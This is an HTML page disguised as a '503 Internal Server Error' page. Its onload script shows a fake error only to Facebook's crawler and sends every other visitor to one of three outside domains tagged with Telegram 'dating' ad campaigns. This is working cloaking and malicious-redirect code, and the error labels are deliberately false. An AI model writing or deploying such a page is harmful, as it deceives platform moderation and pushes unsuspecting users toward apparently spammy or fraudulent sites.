<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>503 Internal Server Error</title>
    <script>
        window.onload = function() {
            // Check the user agent
            const userAgent = navigator.userAgent;

            // Simulate checking for Facebook's crawler
            if (userAgent.includes('facebookexternalhit')) {
                // Simulate sending a 500 error response
                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
                return; // Stop further execution
            }

            // Otherwise, redirect to a random page
            const pages = [
                "https://spabadu.site?utm_source=telegram&utm_medium=cpc&utm_campaign=dating_apps",
                "https://ganikawo.store/?utm_source=telegram&utm_medium=cpc&utm_campaign=dating_videos",
                "https://spabadu.site?utm_source=telegram&utm_medium=cpc&utm_campaign=dating_chat"
            ];
            const randomPage = pages[Math.floor(Math.random() * pages.length)];
            window.location.href = randomPage;
        };
    </script>
</head>
